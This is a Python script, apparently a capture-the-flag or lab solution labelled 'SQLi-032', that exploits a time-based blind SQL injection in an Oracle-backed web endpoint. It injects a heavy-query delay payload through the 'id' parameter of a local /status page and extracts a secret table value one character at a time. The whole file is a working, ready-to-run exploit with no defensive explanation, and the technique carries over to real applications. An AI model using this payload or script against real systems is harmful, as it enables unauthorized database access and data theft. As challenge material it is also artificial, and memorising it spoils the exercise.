#!/usr/bin/env python3
"""SQLi-032: Oracle Heavy Query Exploit"""
import requests, time, string

def check(cond):
    start = time.time()
    payload = f"REQ001' AND (SELECT CASE WHEN ({cond}) THEN (SELECT COUNT(*) FROM all_objects a,all_objects b WHERE ROWNUM<30000) ELSE 1 END FROM dual)>0--"
    requests.get(f"http://localhost:5032/status?id={requests.utils.quote(payload)}", timeout=60)
    return time.time() - start > 2

def extract(table, column):
    result = ""
    for pos in range(1, 50):
        for c in string.ascii_letters + string.digits + "_{}" :
            if check(f"SUBSTR((SELECT {column} FROM {table} WHERE ROWNUM=1),{pos},1)='{c}'"):
                result += c
                print(f"[+] {column}: {result}")
                break
        else:
            break
    return result

if __name__ == "__main__":
    print("SQLi-032: Oracle Heavy Query Exploit")
    flag = extract("secrets", "value")
    print(f"[+] FLAG: {flag}")
